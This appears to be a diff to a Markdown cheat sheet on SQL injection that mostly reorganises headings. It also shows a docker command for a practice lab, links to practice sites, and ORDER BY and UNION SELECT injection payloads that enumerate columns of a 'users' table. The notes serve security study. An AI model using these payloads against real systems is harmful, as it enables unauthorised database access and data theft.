@@ -66,13 +66,15 @@
    docker run -d -p 8000:80 gitlab.cylab.be:8081/cylab/play/sqlite-injection
    ```
 
+# SQL Injection
+
 ## Other SQL injection sites
 
 - https://altoromutual.com/login.jsp
 
 - https://redtiger.labs.overthewire.org/
 
-### ERROR
+## ERROR
 - Use `ORDER BY` to check numbers of colums
 ```
 ' ORDER BY 1--
@@ -80,9 +82,9 @@
 ...
 ```
 
-### UNION
+## UNION
 
-#### MySQL
+### MySQL
 - https://portswigger.net/web-security/sql-injection/union-attacks
 
 - Get database name
@@ -98,7 +100,7 @@
 ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users'#
 ```
 
-#### SQLite
+### SQLite
 
 - Get table_names
 ```
